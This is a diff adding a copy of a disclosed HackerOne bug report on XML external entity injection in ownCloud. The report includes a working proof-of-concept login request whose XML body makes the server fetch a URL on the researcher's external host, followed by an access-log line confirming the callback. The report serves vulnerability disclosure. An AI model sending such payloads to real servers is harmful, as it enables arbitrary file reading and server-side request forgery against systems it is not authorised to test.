@@ -1,0 +1,34 @@
+ReportLink:https://hackerone.com/reports/105980
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/d0znpp
+ReportedTo:ownCloud(owncloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:27.01.2016 20:06:09
+
+Summary:
+
+Improper XML parser configuration provide attacker to read arbitrary files and make HTTP requests from server side.
+
+Exploit example is listed below:
+```
+POST /user/login HTTP/1.1
+Host: 144.76.105.208
+Accept: */*
+Content-type: application/xml
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Length: 163
+
+<?xml version="1.0"?>
+<!DOCTYPE a [
+<!ENTITY % select SYSTEM "http://wallarm.tools/ok">
+%select;
+]>
+<a>wlrm-scnr</a>
+```
+
+From access.log on this server:
+2a01:4f8:192:50d6::2 - - [18/Dec/2015:21:11:47 +0300] "GET /ok HTTP/1.0" 200 227 "-" "-"
